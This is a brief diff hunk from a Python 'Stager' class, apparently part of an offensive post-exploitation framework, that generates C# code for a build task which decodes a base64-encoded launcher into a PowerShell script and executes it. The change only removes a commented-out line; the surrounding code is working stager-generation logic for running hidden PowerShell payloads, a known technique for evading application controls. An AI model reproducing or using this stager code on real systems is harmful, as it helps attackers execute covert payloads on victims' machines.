@@ -139,7 +139,6 @@ class Stager:
                 code += "{"
                 code += "public override bool Execute()"
                 code += "{"
-                #code += "string script = \""+launcher.replace('"','\\"')+"\";"
                 code += "byte[] data = Convert.FromBase64String(\""+launcher+"\");string script = Encoding.Unicode.GetString(data);"
                 code += "PSExecute(script);"
                 code += "return true;"
